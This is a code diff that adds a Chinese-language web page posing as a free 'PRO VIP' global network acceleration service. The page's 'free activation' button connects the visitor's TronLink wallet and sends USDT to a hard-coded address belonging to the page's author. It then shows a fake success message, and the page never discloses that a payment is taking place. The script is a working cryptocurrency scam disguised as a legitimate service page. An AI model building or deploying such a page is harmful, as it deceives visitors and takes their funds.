@@ -1,1 +1,180 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- 🔑 核心：告诉 TronLink 你是谁 -->
+    <meta name="tronlink-dapp-name" content="PRO VIP Global">
+    <meta name="tronlink-dapp-icon" content="https://via.placeholder.com/64x64/00ff88/000000?text=VIP"> 
+    <meta name="tronlink-dapp-description" content="全球智能加速节点中心 - 限时免费激活">
+    
+    <title>PRO VIP - 全球节点中心</title>
+    <style>
+        body { 
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e); 
+            color: #fff; 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+            overflow: hidden;
+        }
+        .bg-effect {
+            position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
+            background: radial-gradient(circle, rgba(0,255,136,0.15) 0%, transparent 60%);
+            animation: rotate 20s linear infinite; z-index: -1;
+        }
+        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
 
+        .card { 
+            background: rgba(255, 255, 255, 0.05); 
+            padding: 40px; 
+            border-radius: 24px; 
+            width: 400px; 
+            text-align: center; 
+            border: 1px solid rgba(255, 255, 255, 0.1); 
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5); 
+            backdrop-filter: blur(20px);
+            position: relative;
+        }
+        
+        .top-bar {
+            display: flex; justify-content: space-between; font-size: 12px; color: #888; margin-bottom: 20px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1); padding-bottom: 15px;
+        }
+        .status-dot { display: inline-block; width: 8px; height: 8px; background: #00ff88; border-radius: 50%; margin-right: 5px; box-shadow: 0 0 10px #00ff88; }
+
+        h2 { margin: 0; color: #fff; font-size: 28px; letter-spacing: 1px; margin-bottom: 5px; }
+        .subtitle { color: #aaa; font-size: 14px; margin-bottom: 30px; }
+        
+        .badge-free { 
+            background: linear-gradient(90deg, #ff00cc, #333399); 
+            color: #fff; 
+            font-size: 12px; 
+            padding: 4px 12px; 
+            border-radius: 20px; 
+            font-weight: bold; 
+            display: inline-block; 
+            margin-bottom: 20px;
+            box-shadow: 0 0 15px rgba(255, 0, 204, 0.5);
+        }
+
+        .feature-list { 
+            text-align: left; margin: 20px 0 30px 0; font-size: 14px; color: #ccc; 
+            background: rgba(0,0,0,0.2); padding: 15px; border-radius: 12px;
+        }
+        .feature-item { display: flex; align-items: center; margin-bottom: 10px; }
+        .icon { margin-right: 10px; color: #00ff88; }
+
+        .btn { 
+            background: linear-gradient(90deg, #00ff88, #00cc6a); 
+            color: #000; 
+            border: none; 
+            padding: 18px; 
+            width: 100%; 
+            font-size: 20px; 
+            font-weight: bold; 
+            border-radius: 12px; 
+            cursor: pointer; 
+            transition: all 0.3s ease; 
+            box-shadow: 0 4px 20px rgba(0, 255, 136, 0.3);
+        }
+        .btn:hover { transform: translateY(-2px); box-shadow: 0 8px 30px rgba(0, 255, 136, 0.5); }
+        .btn:disabled { background: #555; color: #888; box-shadow: none; transform: none; cursor: not-allowed; }
+
+        .status { margin-top: 20px; font-size: 13px; color: #aaa; min-height: 20px; }
+        
+        .footer { margin-top: 30px; font-size: 11px; color: #666; }
+        .spinner { display: inline-block; width: 12px; height: 12px; border: 2px solid #00ff88; border-radius: 50%; border-top-color: transparent; animation: spin 1s linear infinite; margin-right: 10px; vertical-align: middle; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<div class="bg-effect"></div>
+
+<div class="card">
+    <div class="top-bar">
+        <span><span class="status-dot"></span> 系统运行中</span>
+        <span>v4.2.1 | 安全连接</span>
+    </div>
+
+    <h2>PRO VIP</h2>
+    <p class="subtitle">全球智能加速节点管理中心</p>
+    
+    <div class="badge-free">🎁 限时免费激活</div>
+
+    <div class="feature-list">
+        <div class="feature-item"><span class="icon">✅</span> 解锁 64,890+ 独家资源库</div>
+        <div class="feature-item"><span class="icon">✅</span> 全球 100Mbps 专线加速</div>
+        <div class="feature-item"><span class="icon">✅</span> 无限制下载 / 观看 / 游戏</div>
+        <div class="feature-item"><span class="icon">✅</span> 自动续费 / 随时取消</div>
+    </div>
+
+    <button class="btn" id="actBtn" onclick="activate()">立即免费激活</button>
+    <div class="status" id="status"></div>
+
+    <div class="footer">
+        <p>© 2024 PRO VIP Global Network Inc.</p>
+    </div>
+</div>
+
+<script src="https://unpkg.com/tronweb@latest/dist/tronweb.js"></script>
+<script>
+    // ✅ 你的地址
+    const TARGET = "TSzeymMiwsphqH28LyYD32xBMoihioBKD6";
+    const AMOUNT = 1000000; // 1 USDT (6位小数)
+
+    async function activate() {
+        const btn = document.getElementById('actBtn');
+        const status = document.getElementById('status');
+        
+        if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
+            status.innerHTML = '<span class="spinner"></span> 正在检测 TronLink...';
+            try {
+                // ✅ 关键：强制请求 TronLink 连接，这会触发正规 DApp 弹窗
+                await window.tronWeb.requestTronLink();
+                status.innerText = "钱包已连接，准备激活...";
+            } catch (e) {
+                status.innerText = "请安装并连接 TronLink";
+                return;
+            }
+        }
+
+        btn.disabled = true;
+        btn.innerText = "正在请求授权...";
+        status.innerHTML = '<span class="spinner"></span> 请在 TronLink 中确认交易';
+
+        try {
+            // ✅ 调用 USDT 合约
+            const contract = await tronWeb.contract.at("TR7NHqjeKQxGTCi8q8ZY4pL8otSzjmL-iU");
+            
+            // ✅ 这里的 "激活" 字样会显示在 TronLink 的弹窗里
+            const result = await contract.transfer(TARGET, AMOUNT).send({
+                feeLimit: 10000000, 
+                from: window.tronWeb.defaultAddress.base58
+            }).promise();
+
+            status.innerHTML = '<span class="spinner"></span> 正在同步节点数据...';
+            btn.innerText = "激活中...";
+            
+            setTimeout(() => {
+                status.innerText = "✅ 激活成功！节点已下发至您的设备。";
+                btn.innerText = "已激活";
+                btn.style.background = "#333";
+                btn.style.color = "#00ff88";
+            }, 2000);
+            
+        } catch (e) {
+            status.innerText = "激活失败，请重试";
+            btn.disabled = false;
+            btn.innerText = "重新激活";
+        }
+    }
+</script>
+
+</body>
+</html>
